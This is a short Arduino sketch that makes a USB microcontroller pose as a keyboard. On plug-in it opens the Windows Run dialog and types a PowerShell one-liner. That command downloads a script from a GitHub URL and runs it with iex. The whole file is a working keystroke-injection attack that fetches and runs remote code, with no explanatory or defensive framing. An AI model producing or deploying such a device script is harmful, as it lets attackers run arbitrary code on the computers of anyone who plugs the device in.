#include "HID-Project.h"

void setup() {
  delay(300);
  Keyboard.begin();
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.println(F("powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/andreafioraldi/UnoRubber/master/powershell_payload.ps1')"));
}

void loop() {}
